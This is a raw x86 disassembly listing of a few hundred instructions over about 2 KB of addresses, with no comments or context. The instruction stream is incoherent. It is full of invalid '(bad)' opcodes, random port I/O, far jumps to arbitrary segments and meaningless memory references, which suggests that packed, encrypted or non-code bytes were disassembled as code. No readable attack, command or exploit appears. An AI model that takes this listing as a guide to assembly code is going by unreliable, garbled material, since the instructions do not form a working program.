  41fa9f:	mov    edx,0xd5bd2d58
  41faa4:	and    eax,0x65c68621
  41faa9:	cmp    BYTE PTR ds:[eax+0x5b],bl
  41faad:	lock pop es
  41faaf:	adc    al,0x10
  41fab1:	in     eax,0x8a
  41fab3:	dec    esp
  41fab4:	jp     0x41faf0
  41fab6:	int    0x27
  41fab8:	cmp    al,0xb8
  41faba:	mov    al,0x1b
  41fabc:	int3   
  41fabd:	mov    ds:0xe2cdbc31,eax
  41fac2:	sbb    eax,0x960344e1
  41fac7:	mov    cl,BYTE PTR [edi]
  41fac9:	or     dh,BYTE PTR ds:0x1f17007e
  41facf:	(bad)  
  41fad0:	rcr    DWORD PTR [edi-0x19247c52],cl
  41fad6:	push   eax
  41fad7:	mov    ecx,DWORD PTR [eax]
  41fad9:	cmp    al,0xf
  41fadb:	sbb    ah,BYTE PTR [esi+0x41]
  41fade:	xor    DWORD PTR [eax],ebp
  41fae0:	jae    0x41fac8
  41fae2:	clc    
  41fae3:	or     BYTE PTR [esi-0x762c9f85],cl
  41fae9:	cmp    BYTE PTR [eax-0x53],ch
  41faec:	adc    BYTE PTR [eax-0x390606a1],ah
  41faf2:	out    dx,al
  41faf3:	call   0xa5f9fc55
  41faf8:	and    dl,BYTE PTR [ecx+0x49]
  41fafb:	repnz xchg esp,eax
  41fafd:	imul   eax,ecx,0xcbce840e
  41fb03:	call   0xcf4e23e7
  41fb08:	mov    ch,0xdc
  41fb0a:	adc    al,BYTE PTR [edx+0x3f]
  41fb0d:	ror    ecx,cl
  41fb0f:	aad    0x8e
  41fb11:	mov    dl,0xe9
  41fb13:	out    0x9e,eax
  41fb15:	lea    ebp,[eax+eax*2+0xd7c78ca]
  41fb1c:	xchg   ecx,edx
  41fb1e:	js     0x41fae8
  41fb20:	mov    bl,0xf8
  41fb22:	pop    ebx
  41fb23:	nop
  41fb24:	out    0x36,al
  41fb26:	sahf   
  41fb27:	lea    esp,[edi]
  41fb29:	add    edx,DWORD PTR [edi+0x2d]
  41fb2c:	jp     0x41fb96
  41fb2e:	inc    esp
  41fb2f:	cli    
  41fb30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb31:	jecxz  0x41fb7d
  41fb33:	dec    eax
  41fb34:	pop    es
  41fb35:	mov    ?,WORD PTR [esi-0x6e]
  41fb38:	and    cl,BYTE PTR [ebx]
  41fb3a:	and    ecx,DWORD PTR [eax]
  41fb3c:	adc    DWORD PTR [ebp+edx*4-0x26b9f40],esi
  41fb43:	in     eax,0xbb
  41fb45:	fiadd  WORD PTR [edx+0x1d]
  41fb48:	inc    ecx
  41fb49:	nop
  41fb4a:	pusha  
  41fb4b:	pop    esp
  41fb4c:	or     DWORD PTR [ecx+ebp*8-0x4],esp
  41fb50:	out    dx,al
  41fb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb52:	inc    ebp
  41fb53:	jmp    0x387b:0x584d39d0
  41fb5a:	jmp    0x46efad6d
  41fb5f:	and    DWORD PTR [edx],ecx
  41fb61:	xchg   esp,eax
  41fb62:	pop    ebx
  41fb63:	pop    ss
  41fb64:	or     ecx,eax
  41fb66:	ja     0x41fb43
  41fb68:	xor    eax,0xa36475c0
  41fb6d:	aas    
  41fb6e:	cld    
  41fb6f:	sti    
  41fb70:	adc    esp,ebx
  41fb72:	popa   
  41fb73:	pop    es
  41fb74:	stc    
  41fb75:	(bad)  
  41fb76:	cwde   
  41fb77:	inc    ecx
  41fb78:	and    edi,DWORD PTR [ebx]
  41fb7a:	jno    0x41fbd9
  41fb7c:	dec    ebx
  41fb7d:	push   edx
  41fb7e:	stos   BYTE PTR es:[edi],al
  41fb7f:	jnp    0x41fb91
  41fb81:	push   esp
  41fb82:	mov    eax,ebx
  41fb84:	push   0xffffffab
  41fb86:	jmp    0x41fbaa
  41fb88:	lahf   
  41fb89:	jns    0x41fbcf
  41fb8b:	mov    al,ds:0xe34ed7b0
  41fb90:	fsubr  st(7),st
  41fb92:	imul   DWORD PTR [ecx-0x6c6051a4]
  41fb98:	mov    esp,0xd7611841
  41fb9d:	jbe    0x41fb80
  41fb9f:	xchg   DWORD PTR [ebx-0x6f33b40],edi
  41fba5:	jmp    DWORD PTR [eax-0x7f]
  41fba8:	xchg   esp,eax
  41fba9:	fwait
  41fbaa:	test   al,0xaf
  41fbac:	jg     0x41fbf1
  41fbae:	xor    DWORD PTR [edx],esp
  41fbb0:	cmp    DWORD PTR [esi],esi
  41fbb2:	call   FWORD PTR [eax+0x33]
  41fbb5:	add    DWORD PTR ds:0x8efb3794,eax
  41fbbb:	mov    al,ds:0x1f474872
  41fbc0:	scas   eax,DWORD PTR es:[edi]
  41fbc1:	mov    ds:0x2d836617,eax
  41fbc6:	sbb    al,BYTE PTR [ebx]
  41fbc8:	mov    cl,0x4b
  41fbca:	jnp    0x41fbd3
  41fbcc:	je     0x41fc16
  41fbce:	das    
  41fbcf:	hlt    
  41fbd0:	daa    
  41fbd1:	int3   
  41fbd2:	out    dx,al
  41fbd3:	nop
  41fbd4:	sbb    esi,DWORD PTR [ebp+edx*2+0x51]
  41fbd8:	aaa    
  41fbd9:	fiadd  WORD PTR [ebx]
  41fbdb:	test   al,0xff
  41fbdd:	cdq    
  41fbde:	push   edi
  41fbdf:	shr    dh,cl
  41fbe1:	add    eax,0x8c60611f
  41fbe6:	rcr    BYTE PTR [ebp-0x6279182a],cl
  41fbec:	adc    DWORD PTR [esi+0x6c],0x2e23e68d
  41fbf3:	sub    esp,DWORD PTR [edi-0x5f3c56e6]
  41fbf9:	rcr    DWORD PTR [ecx],1
  41fbfb:	and    ah,BYTE PTR [ebx+ebp*1-0x6dfb61eb]
  41fc02:	repnz div DWORD PTR [ebx]
  41fc05:	mov    BYTE PTR [eax+0x75ca403c],al
  41fc0b:	mov    esp,0x515f65eb
  41fc10:	adc    DWORD PTR [ecx],esi
  41fc12:	ret    0xa626
  41fc15:	sub    ch,BYTE PTR [edi-0x1]
  41fc18:	sub    BYTE PTR [ecx-0x2a],cl
  41fc1b:	fs mov ecx,0xe8a430fc
  41fc21:	sar    esp,cl
  41fc23:	jmp    0x563ef7ca
  41fc28:	outs   dx,BYTE PTR ds:[esi]
  41fc29:	mov    ebx,0x746ae109
  41fc2e:	int    0x7d
  41fc30:	sub    esi,DWORD PTR [edi-0x60]
  41fc33:	ss scas eax,DWORD PTR es:[edi]
  41fc35:	ror    DWORD PTR [edx+0x3d54df56],cl
  41fc3b:	push   ebp
  41fc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc3d:	mov    bl,BYTE PTR [edi]
  41fc3f:	ins    BYTE PTR es:[edi],dx
  41fc40:	sub    DWORD PTR [ebp+0x5b],edx
  41fc43:	(bad)  
  41fc44:	in     eax,0xd3
  41fc46:	push   esi
  41fc47:	inc    edx
  41fc48:	icebp  
  41fc49:	(bad)  
  41fc4a:	stos   DWORD PTR es:[edi],eax
  41fc4b:	jl     0x41fc42
  41fc4d:	scas   al,BYTE PTR es:[edi]
  41fc4e:	jle    0x41fc7a
  41fc50:	mov    ah,0x5
  41fc52:	ror    DWORD PTR [ecx],1
  41fc54:	repnz test BYTE PTR [ecx+0x8075574],ah
  41fc5b:	push   ss
  41fc5c:	daa    
  41fc5d:	shl    BYTE PTR [ebx-0x2269566],1
  41fc63:	xor    al,0xd7
  41fc65:	outs   dx,DWORD PTR ds:[esi]
  41fc66:	jmp    0xb8cf6738
  41fc6b:	fwait
  41fc6c:	xchg   ecx,eax
  41fc6d:	stos   DWORD PTR es:[edi],eax
  41fc6e:	add    al,0xc3
  41fc70:	jae    0x41fc5e
  41fc72:	jle    0x41fc9e
  41fc74:	stos   BYTE PTR es:[edi],al
  41fc75:	xchg   edx,eax
  41fc76:	inc    ebp
  41fc77:	xchg   ecx,eax
  41fc78:	dec    ebp
  41fc79:	sbb    BYTE PTR [edi-0x132d4263],bh
  41fc7f:	cli    
  41fc80:	call   0xdec7:0xd8159790
  41fc87:	and    al,0xff
  41fc89:	cmp    cl,dh
  41fc8b:	pop    edi
  41fc8c:	push   0xfffffffb
  41fc8e:	add    esp,DWORD PTR ds:0x1f46b67f
  41fc94:	cmp    BYTE PTR [ecx+0x528ec8de],ah
  41fc9a:	aam    0x22
  41fc9c:	loope  0x41fce9
  41fc9e:	push   ecx
  41fc9f:	mov    ds:0xa888c7b5,al
  41fca4:	iret   
  41fca5:	shl    bl,0x20
  41fca8:	add    dh,BYTE PTR [edx+0x9]
  41fcab:	cmc    
  41fcac:	jmp    0x508760fe
  41fcb1:	push   0xffffffb7
  41fcb3:	sbb    eax,DWORD PTR [edx+0x73]
  41fcb6:	popf   
  41fcb7:	popf   
  41fcb8:	push   ecx
  41fcb9:	fimul  DWORD PTR [ebx+edx*1]
  41fcbd:	inc    ebx
  41fcbe:	test   DWORD PTR [edx],0x300f5325
  41fcc4:	aas    
  41fcc5:	test   esi,0xc9820eaa
  41fccb:	icebp  
  41fccc:	fld    TBYTE PTR [esi-0x3184ddcd]
  41fcd2:	pop    ecx
  41fcd3:	xor    DWORD PTR es:[ebx-0x55d5ffe9],edx
  41fcda:	add    BYTE PTR es:[esi+0x38],0x25
  41fcdf:	out    dx,eax
  41fce0:	add    eax,0x58920aa8
  41fce5:	aad    0x5d
  41fce7:	mov    esp,DWORD PTR [ebx]
  41fce9:	and    al,0xc4
  41fceb:	les    ecx,FWORD PTR [ecx+ecx*8+0x5dc45edf]
  41fcf2:	fnstsw WORD PTR [esi-0x4b6fce1e]
  41fcf8:	stc    
  41fcf9:	lea    edi,[edi]
  41fcfb:	push   ebp
  41fcfc:	call   0xc75:0x765d4b7e
  41fd03:	stos   DWORD PTR es:[edi],eax
  41fd04:	inc    ebx
  41fd05:	out    dx,eax
  41fd06:	shr    bl,1
  41fd08:	inc    ebx
  41fd09:	xor    ebx,eax
  41fd0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0c:	adc    DWORD PTR [esi-0x4f],ecx
  41fd0f:	sbb    al,0xd7
  41fd11:	xchg   edx,eax
  41fd12:	scas   eax,DWORD PTR es:[edi]
  41fd13:	in     al,dx
  41fd14:	mov    eax,0xf30a592
  41fd19:	push   eax
  41fd1a:	pop    es
  41fd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd1c:	and    esi,DWORD PTR [ebx+0x7fb473f]
  41fd22:	rol    BYTE PTR ds:0x35b56c1a,1
  41fd28:	jp     0x41fd38
  41fd2a:	pop    ebp
  41fd2b:	mov    ds:0xd8538d76,eax
  41fd30:	push   cs
  41fd31:	push   ecx
  41fd32:	sar    BYTE PTR [edx+0x30],1
  41fd35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd36:	(bad)  
  41fd37:	push   0x73
  41fd39:	lods   eax,DWORD PTR ds:[esi]
  41fd3a:	lods   al,BYTE PTR ds:[si]
  41fd3c:	call   0x4b56:0xa21a118f
  41fd43:	pop    es
  41fd44:	inc    ebx
  41fd45:	mov    BYTE PTR [edi],al
  41fd47:	je     0x41fd37
  41fd49:	std    
  41fd4a:	test   BYTE PTR [edx+eax*4-0x35],ch
  41fd4e:	pusha  
  41fd4f:	adc    al,0x63
  41fd51:	fimul  DWORD PTR [esi]
  41fd53:	loope  0x41fd4a
  41fd55:	mov    edx,0xdc189f7b
  41fd5a:	sub    dh,BYTE PTR [esi-0x2]
  41fd5d:	pop    edx
  41fd5e:	pushf  
  41fd5f:	jmp    0x55db98b0
  41fd64:	not    DWORD PTR [eax]
  41fd66:	xor    dl,BYTE PTR [ebp+0x42]
  41fd69:	lock mov al,ds:0xf6023655
  41fd6f:	je     0x41fd2b
  41fd71:	add    ah,ch
  41fd73:	mov    ch,0xa9
  41fd75:	dec    ebp
  41fd76:	and    eax,0x354ead42
  41fd7b:	xor    DWORD PTR [esi+0x27],esp
  41fd7e:	cmp    BYTE PTR [esi+0x5b],cl
  41fd81:	adc    ecx,ebp
  41fd83:	jecxz  0x41fd5d
  41fd85:	into   
  41fd86:	or     edi,DWORD PTR [eax-0x5c]
  41fd89:	sub    al,0x66
  41fd8b:	mov    dh,BYTE PTR [edi-0x74d3818e]
  41fd91:	pop    ds
  41fd92:	jno    0x41fdb3
  41fd94:	sbb    eax,0xfd17ea9c
  41fd99:	pop    ss
  41fd9a:	rcr    edx,cl
  41fd9c:	jmp    0xad85:0x42fea370
  41fda3:	maxps  xmm4,xmm1
  41fda6:	in     al,dx
  41fda7:	pop    ecx
  41fda8:	add    eax,0x4c909fd9
  41fdad:	dec    ebp
  41fdae:	ret    
  41fdaf:	cmp    eax,0x6cfdddd7
  41fdb4:	sbb    al,0x7b
  41fdb6:	push   ss
  41fdb7:	fadd   DWORD PTR [ebp+0x3d]
  41fdba:	nop
  41fdbb:	adc    eax,esp
  41fdbd:	shl    DWORD PTR [esi],0x1
  41fdc0:	xchg   ebp,eax
  41fdc1:	out    0xfc,al
  41fdc3:	mov    BYTE PTR [ebp-0x4c],0xe7
  41fdc7:	jno    0x41fdc6
  41fdc9:	add    al,0xc6
  41fdcb:	add    DWORD PTR [ebx-0x2ae55c55],0xf0566938
  41fdd5:	out    0xf,eax
  41fdd7:	adc    cl,BYTE PTR [eax-0x9884da5]
  41fddd:	jge    0x41fe03
  41fddf:	enter  0x7ecb,0xfb
  41fde3:	ds fs add al,0x8
  41fde7:	fld    QWORD PTR ds:[edx-0x1d]
  41fdeb:	aas    
  41fdec:	loop   0x41fd90
  41fdee:	mov    al,0x6a
  41fdf0:	repz jne 0x41fe57
  41fdf3:	fild   WORD PTR [esi]
  41fdf5:	aad    0x3e
  41fdf7:	imul   ecx,DWORD PTR [eax+ebx*8],0x65
  41fdfb:	scas   eax,DWORD PTR es:[edi]
  41fdfc:	out    dx,eax
  41fdfd:	test   ebp,esp
  41fdff:	add    eax,0xa1fe5cd8
  41fe04:	pop    edx
  41fe05:	icebp  
  41fe06:	xadd   DWORD PTR [esi-0x70b09103],esp
  41fe0d:	jecxz  0x41fe2a
  41fe0f:	lods   eax,DWORD PTR ds:[esi]
  41fe10:	mov    ds:0x3111feee,al
  41fe15:	xchg   BYTE PTR [ecx],ah
  41fe17:	inc    esi
  41fe18:	mov    esp,0x3ca01482
  41fe1d:	add    bh,bh
  41fe1f:	pop    ds
  41fe20:	or     esp,DWORD PTR [ecx-0x2f46c5e4]
  41fe26:	cmp    edi,edi
  41fe28:	jmp    0xb6022245
  41fe2d:	dec    ebx
  41fe2e:	or     eax,0x2ccd67e
  41fe33:	push   esp
  41fe34:	loop   0x41fde7
  41fe36:	mov    esi,0xdc9f3482
  41fe3b:	pushf  
  41fe3c:	and    BYTE PTR [bx+si-0x10],dh
  41fe40:	push   ebp
  41fe41:	cli    
  41fe42:	add    al,BYTE PTR [esi-0xb2e260c]
  41fe48:	dec    eax
  41fe49:	pusha  
  41fe4a:	sub    ch,BYTE PTR [edi+0xf5ceea5]
  41fe50:	lahf   
  41fe51:	in     eax,dx
  41fe52:	fsubr  st,st(1)
  41fe54:	iret   
  41fe55:	lea    edx,[edx+edx*2+0x37548509]
  41fe5c:	(bad)  
  41fe5d:	retf   0x97ef
  41fe60:	mov    eax,ds:0x29a2edd8
  41fe65:	sbb    cl,BYTE PTR [edi-0x6ae847db]
  41fe6b:	adc    ch,BYTE PTR cs:[ebx]
  41fe6e:	daa    
  41fe6f:	cmp    BYTE PTR [ebx+ebx*8-0x35],al
  41fe73:	pop    ds
  41fe74:	mov    cl,0x7a
  41fe76:	retf   
  41fe77:	add    al,dh
  41fe79:	or     DWORD PTR [ebx],eax
  41fe7b:	mov    esp,0x67814f49
  41fe80:	push   ecx
  41fe81:	mov    ch,0x9e
  41fe83:	dec    ebx
  41fe84:	sub    eax,0x531bac51
  41fe89:	sub    DWORD PTR [esi-0x5f],ebx
  41fe8c:	cmp    eax,0x38ac8ffa
  41fe91:	ja     0x41fe7e
  41fe93:	push   edi
  41fe94:	je     0x41fe58
  41fe96:	pushf  
  41fe97:	mov    ah,0x2
  41fe99:	sbb    dh,bh
  41fe9b:	mov    dl,0xff
  41fe9d:	mov    eax,ds:0x5e8b77ce
  41fea2:	sub    esp,0x8
  41fea5:	adc    BYTE PTR [ebp-0x45],cl
  41fea8:	pop    es
  41fea9:	mov    bl,0x5a
  41feab:	inc    eax
  41feac:	or     edi,DWORD PTR [esi]
  41feae:	popa   
  41feaf:	cmp    eax,0x8e41bfc3
  41feb4:	out    dx,eax
  41feb5:	push   0x6e312657
  41feba:	cmp    ebx,DWORD PTR ds:[ecx-0x7d8c554]
  41fec1:	test   DWORD PTR [esi-0x3c],esi
  41fec4:	dec    ebp
  41fec5:	cmp    eax,0x5adfcb37
  41feca:	outs   dx,BYTE PTR ds:[esi]
  41fecb:	mov    bh,0x9e
  41fecd:	lds    edx,FWORD PTR [eax-0xe5889d8]
  41fed3:	bound  eax,QWORD PTR [esi+0x4f]
  41fed6:	xor    ch,BYTE PTR [edi]
  41fed8:	(bad)  
  41fed9:	jecxz  0x41ff59
  41fedb:	jbe    0x41ff18
  41fedd:	scas   eax,DWORD PTR es:[edi]
  41fede:	and    dh,BYTE PTR [eax-0x72]
  41fee1:	scas   eax,DWORD PTR es:[edi]
  41fee2:	mov    edx,0xa1f7ba94
  41fee7:	cmp    al,0x41
  41fee9:	in     eax,0x3
  41feeb:	addr16 push 0x5b
  41feee:	outs   dx,BYTE PTR ds:[esi]
  41feef:	mov    esi,0xbeeec8fa
  41fef4:	mov    edi,0x39082b5
  41fef9:	sub    eax,0x9108763c
  41fefe:	add    eax,ebx
  41ff00:	mov    bh,0x91
  41ff02:	ja     0x41fef4
  41ff04:	jb     0x41ff52
  41ff06:	mov    cl,0x1
  41ff08:	xlat   BYTE PTR ds:[ebx]
  41ff09:	nop
  41ff0a:	add    BYTE PTR [edx-0x7231d45d],dl
  41ff10:	mov    cl,0xf0
  41ff12:	jbe    0x41ff0f
  41ff14:	test   eax,0x94786725
  41ff19:	inc    esp
  41ff1a:	mov    DWORD PTR [edx+0x3c],esi
  41ff1d:	int    0x9e
  41ff1f:	lds    edi,FWORD PTR [esi+0x39]
  41ff22:	popf   
  41ff23:	mov    ah,bl
  41ff25:	push   ss
  41ff26:	dec    esi
  41ff27:	push   eax
  41ff28:	mov    ah,0xfd
  41ff2a:	bound  ebp,QWORD PTR [edx-0x5fe47fab]
  41ff30:	(bad)  [ebp+0x17d7f27b]
  41ff36:	fs cli 
  41ff38:	les    edi,FWORD PTR [edx-0x4ce16eb0]
  41ff3e:	pop    edx
  41ff3f:	mov    ds:0xc5d3b8eb,eax
  41ff44:	xor    al,0x1f
  41ff46:	sahf   
  41ff47:	cdq    
  41ff48:	xor    DWORD PTR [edi+edi*4],0xb604365a
  41ff4f:	lea    ebx,[ebx]
  41ff51:	mov    edi,eax
  41ff53:	push   ecx
  41ff54:	xor    BYTE PTR [esi-0x158ace63],dl
  41ff5a:	inc    ebp
  41ff5b:	jnp    0x41ff5b
  41ff5d:	sub    al,BYTE PTR [esi-0x3c4fb3e9]
  41ff63:	cmp    edx,DWORD PTR [ecx+0x7fa4bd3e]
  41ff69:	pop    ebp
  41ff6a:	pop    edx
  41ff6b:	mov    ds,eax
  41ff6d:	dec    ecx
  41ff6e:	sbb    BYTE PTR ds:0x72b2c2ba,0xae
  41ff75:	gs sahf 
  41ff77:	int3   
  41ff78:	push   ds
  41ff79:	xchg   ecx,eax
  41ff7a:	inc    ecx
  41ff7b:	gs mov gs,edi
  41ff7e:	push   0xfffffff8
  41ff80:	mov    ah,0xd5
  41ff82:	pop    ss
  41ff83:	cli    
  41ff84:	std    
  41ff85:	shl    DWORD PTR [ebp-0x4d1c7a87],0x13
  41ff8c:	clc    
  41ff8d:	sar    DWORD PTR [esi+0x71],1
  41ff90:	mov    ds:0x1ea4fce3,eax
  41ff95:	mov    edi,0xe8e45754
  41ff9a:	xchg   DWORD PTR [esi],eax
  41ff9c:	in     eax,0xbb
  41ff9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff9f:	aas    
  41ffa0:	adc    al,0x90
  41ffa2:	and    DWORD PTR [edi-0x176c631c],ecx
  41ffa8:	pusha  
  41ffa9:	clc    
  41ffaa:	addr16 mov ecx,0x5548381
  41ffb0:	or     ecx,ecx
  41ffb2:	mov    dl,0x67
  41ffb4:	xor    BYTE PTR [edx-0x1916a56c],cl
  41ffba:	ror    ah,cl
  41ffbc:	sub    ch,BYTE PTR [ebx+0xf]
  41ffbf:	adc    al,0xfe
  41ffc1:	xchg   esp,eax
  41ffc2:	xor    ecx,0xa86785
  41ffc8:	adc    BYTE PTR [edi],dl
  41ffca:	sub    al,0x8
  41ffcc:	ins    DWORD PTR es:[edi],dx
  41ffcd:	cmp    ch,BYTE PTR [ebp+ecx*8-0x2c]
  41ffd1:	scas   eax,DWORD PTR es:[edi]
  41ffd2:	cmp    DWORD PTR [esi-0x37],eax
  41ffd5:	push   ds
  41ffd6:	pop    ecx
  41ffd7:	ins    BYTE PTR es:[edi],dx
  41ffd8:	mov    eax,0xb3481bbb
  41ffdd:	jmp    0x9a8ba88f
  41ffe2:	gs mov edi,0x746f1581
  41ffe8:	jp     0x420055
  41ffea:	inc    ebx
  41ffeb:	sub    DWORD PTR [ebx+0x1f],0x17
  41ffef:	inc    eax
  41fff0:	cmp    ah,al
  41fff2:	add    DWORD PTR [ebx],ebx
  41fff4:	lahf   
  41fff5:	gs cwde 
  41fff7:	jae    0x420029
  41fff9:	mov    ebp,DWORD PTR [esi+0x31]
  41fffc:	idiv   BYTE PTR [ebp+ebx*4-0x414cbd5f]
  420003:	dec    esi
  420004:	pusha  
  420005:	cdq    
  420006:	xor    ecx,ebx
  420008:	add    eax,0xfa6443c0
  42000d:	or     BYTE PTR [eax+0x52],0xac
  420011:	(bad)  
  420013:	add    edx,ecx
  420015:	jle    0x41ffe2
  420017:	and    dl,BYTE PTR ds:0x9abf0aba
  42001d:	jg     0x420080
  42001f:	retf   0x5aaf
  420022:	or     al,0xad
  420024:	hlt    
  420025:	or     BYTE PTR [esi],0x10
  420028:	adc    eax,0xda8060e5
  42002d:	cmp    dh,dh
  42002f:	loopne 0x41ffed
  420031:	call   0xd16a:0x36568173
  420038:	sub    ecx,edi
  42003a:	stos   DWORD PTR es:[edi],eax
  42003b:	daa    
  42003c:	mov    ds:0xa8ec324a,eax
  420041:	int    0x11
  420043:	cmc    
  420044:	call   0xc306:0xa513ec47
  42004b:	(bad)  [ebx-0x52f5d969]
  420051:	enter  0x677a,0xe
  420055:	mov    cs,WORD PTR [eax-0x3bc95db9]
  42005b:	pop    ecx
  42005c:	adc    DWORD PTR fs:[esi+0xd8e3c98],0x58
  420064:	rcr    DWORD PTR [esi+eiz*1-0x3],1
  420068:	data16 adc al,0xd
  42006b:	ss (bad) 
  42006d:	cmc    
  42006e:	jmp    0x4200e8
  420070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420071:	lahf   
  420072:	inc    esp
  420073:	test   ecx,eax
  420075:	lahf   
  420076:	xlat   BYTE PTR ds:[ebx]
  420077:	enter  0xf133,0xbf
  42007b:	fmulp  st(1),st
  42007d:	mov    esp,0x3d80db5a
  420082:	call   0x5ffc:0x2ee6b782
  420089:	sub    ecx,DWORD PTR [edi+0x7e07c6ff]
  42008f:	mov    eax,ds:0xd71d52
  420094:	push   ebx
  420095:	inc    edi
  420096:	inc    esi
  420097:	pop    es
  420098:	imul   edx,DWORD PTR [ecx],0xffffffbf
  42009b:	test   eax,0x585bdeb3
  4200a0:	xchg   ebx,eax
  4200a1:	es push 0x529a71a6
  4200a7:	fs call 0x856e4761
  4200ad:	mov    cl,0x7b
  4200af:	sub    BYTE PTR [edi],dh
  4200b1:	xorps  xmm1,XMMWORD PTR [eax]
  4200b4:	test   BYTE PTR [ebx+0x4b81520e],dl
  4200ba:	ins    DWORD PTR es:[edi],dx
  4200bb:	xchg   edx,eax
  4200bc:	daa    
  4200bd:	xchg   esp,eax
  4200be:	xlat   BYTE PTR ds:[ebx]
  4200bf:	push   ebp
  4200c0:	loope  0x420097
  4200c2:	leave  
  4200c3:	dec    ebp
  4200c4:	es jp  0x4200be
  4200c7:	sub    DWORD PTR [esi+0x9b308e8],0x1
  4200ce:	push   0x3
  4200d0:	in     al,0x8
  4200d2:	inc    edx
  4200d3:	or     DWORD PTR [edx+0x68643169],ebp
  4200d9:	xchg   edx,ecx
  4200db:	aaa    
  4200dc:	adc    eax,0xd37840ec
  4200e1:	test   ebx,ebx
  4200e3:	shl    BYTE PTR [esi-0x11],0xa4
  4200e7:	mov    ah,BYTE PTR [ebx+esi*8]
  4200ea:	call   0x4b49:0x12c50c3b
  4200f1:	test   eax,0xef6be7e7
  4200f6:	cmp    DWORD PTR [edi],esp
  4200f8:	lock enter 0xd9e1,0x52
  4200fd:	bound  ebp,QWORD PTR [eax+0x53e44d0d]
  420103:	jp     0x4200b9
  420105:	imul   esp,esi,0xff553e6a
  42010b:	scas   al,BYTE PTR es:[edi]
  42010c:	and    ch,BYTE PTR [edx]
  42010e:	mov    al,0x2a
  420110:	mov    cl,0x6e
  420112:	adc    esi,0xfb59444
  420118:	push   edi
  420119:	leave  
  42011a:	add    eax,0x371938f8
  42011f:	mov    al,ds:0x1e5ee070
  420124:	loop   0x42019a
  420126:	or     ebp,DWORD PTR [eax]
  420128:	mov    edi,0xe808ee0f
  42012d:	loopne 0x420198
  42012f:	fnsave [edi+edx*1+0x455cf4ed]
  420136:	pushf  
  420137:	jge    0x42015a
  420139:	je     0x420139
  42013b:	(bad)  
  42013c:	jl     0x420133
  42013e:	lds    esp,FWORD PTR [ebp+0x29]
  420141:	push   edx
  420142:	imul   ebp,DWORD PTR [edx+0x39],0x77
  420146:	mov    ch,BYTE PTR [esi-0x67e71eaa]
  42014c:	xlat   BYTE PTR ds:[ebx]
  42014d:	mov    al,ds:0x15a840fd
  420152:	push   esi
  420153:	cmp    ch,BYTE PTR [ebp-0x59]
  420156:	push   ss
  420157:	jge    0x420108
  420159:	arpl   WORD PTR [esi-0x62],dx
  42015c:	cwde   
  42015d:	jmp    0xa297626b
  420162:	xor    dh,0xaa
  420165:	aas    
  420166:	outs   dx,DWORD PTR ds:[esi]
  420167:	stos   DWORD PTR es:[edi],eax
  420168:	adc    esp,ebp
  42016a:	fisttp DWORD PTR [ecx+0xc279cb1]
  420170:	push   ebp
  420171:	dec    edx
  420172:	fbld   TBYTE PTR [ecx+0x4287d310]
  420178:	gs mov eax,0xfc2d6bbb
  42017e:	gs mov cl,0xda
  420181:	dec    eax
  420182:	mov    dl,0x78
  420184:	inc    eax
  420185:	jmp    0x4201d0
  420187:	arpl   si,bx
  420189:	add    DWORD PTR [edx+0x5d09a045],0x26
  420190:	xchg   ah,dl
  420192:	loopne 0x4201e3
  420194:	mov    ebp,0x6ea3a93f
  420199:	gs sbb dl,cl
  42019c:	push   ds
  42019d:	mov    dl,0x56
  42019f:	mov    dh,0x88
  4201a1:	rol    BYTE PTR [eax+edi*2],1
  4201a4:	sti    
  4201a5:	xchg   DWORD PTR [ebp-0x16],ecx
  4201a8:	(bad)  
  4201a9:	loopne 0x4201eb
  4201ab:	mov    esp,0x675bd6a6
  4201b0:	scas   al,BYTE PTR es:[edi]
  4201b1:	fdivr  st(3),st
  4201b3:	fisub  WORD PTR [edx]
  4201b5:	loope  0x4201ce
  4201b7:	add    BYTE PTR [ebp+0x8],0x41
  4201bb:	cmovge edx,DWORD PTR [esi+0x3328842c]
  4201c2:	xor    bh,BYTE PTR [edx+0x17]
  4201c5:	data16 (bad) 
  4201c7:	pop    ebp
  4201c8:	imul   esp,ecx,0x36975136
  4201ce:	add    ebp,esp
  4201d0:	fbld   TBYTE PTR [edi+0x23]
  4201d3:	inc    edx
  4201d4:	cmc    
  4201d5:	aas    
  4201d6:	lds    ebp,FWORD PTR [esi+edi*4]
  4201d9:	in     al,dx
  4201da:	sbb    eax,DWORD PTR [eax-0x42fd68fe]
  4201e0:	mov    ebp,DWORD PTR [edx+0x14]
  4201e3:	repz mov ds:0xb953b904,al
  4201e9:	lds    ebp,FWORD PTR [ebp-0xdeeb400]
  4201ef:	out    dx,eax
  4201f0:	stc    
  4201f1:	mov    esi,0x2477994f
  4201f6:	sub    BYTE PTR [edx],bl
  4201f8:	mov    bl,0x2
  4201fa:	xchg   bl,ah
  4201fc:	cmp    ah,BYTE PTR [edx]
  4201fe:	mov    gs,WORD PTR [eax-0x74d16f72]
  420204:	sub    al,0x9a
  420206:	iret   
  420207:	xor    dh,BYTE PTR [esi-0x23]
  42020a:	js     0x420259
  42020c:	popf   
  42020d:	xor    ch,BYTE PTR [ebx-0x57]
  420210:	lods   al,BYTE PTR ds:[esi]
  420211:	fnsave [edx+0x44]
  420214:	jne    0x420241
  420216:	xchg   edi,eax
  420218:	and    al,0x96
  42021a:	popf   
  42021b:	sub    eax,0xc0fff33a
  420220:	(bad)  
  420221:	jmp    0x9488:0x5dcfa37a
  420228:	cmp    BYTE PTR [esp+ebx*1-0x22aec30e],0x17
  420230:	mov    esi,DWORD PTR [edx-0x9988d8e]
  420236:	mov    ebx,0xf1de2e99
  42023b:	cwde   
  42023c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42023d:	out    dx,al
  42023e:	push   cs
  42023f:	mov    ecx,0x917ee262
  420244:	push   esp
  420245:	(bad)  
  420247:	sbb    al,0x66
  420249:	gs jno 0x4202b4
  42024c:	(bad)  
  42024d:	cmp    BYTE PTR [ebx+0x6a2e6305],ah
  420253:	retf   0xdf6e
  420256:	push   es
  420257:	fmul   QWORD PTR [ecx+0x16]
  42025a:	call   0xb665:0xb9123122
  420261:	or     ebx,ecx
  420263:	inc    eax
  420264:	popa   
